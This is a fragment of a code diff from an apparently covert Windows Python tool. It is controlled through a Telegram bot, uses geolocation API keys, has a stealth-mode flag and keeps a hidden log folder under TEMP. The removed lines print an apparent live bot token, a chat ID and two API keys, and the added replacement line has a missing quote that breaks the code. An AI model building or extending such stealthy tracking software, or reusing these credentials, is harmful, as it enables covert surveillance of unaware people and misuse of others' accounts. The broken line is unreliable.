@@ -18,10 +18,10 @@ import win32process
 import psutil
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
-TELEGRAM_BOT_TOKEN = "8442607855:AAH6oVq0_e08AQlC_s_JvdNkXaajvE5mdMg"
-YOUR_TELEGRAM_CHAT_ID = "7874580550"
-OPENCAGE_API_KEY = "cb157178693b4b25b8e7dcf2655ec476"
-LOCATIONIQ_API_KEY = "pk.ed7943c660f89077669476df958cf642"
+TELEGRAM_BOT_TOKEN = "xxxx"
+YOUR_TELEGRAM_CHAT_ID = "xxxx"
+OPENCAGE_API_KEY = "xxxx"
+LOCATIONIQ_API_KEY = xxxx"
 ENABLE_STEALTH_MODE = True
 def setup_logging():
     log_dir = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), '.syslog')
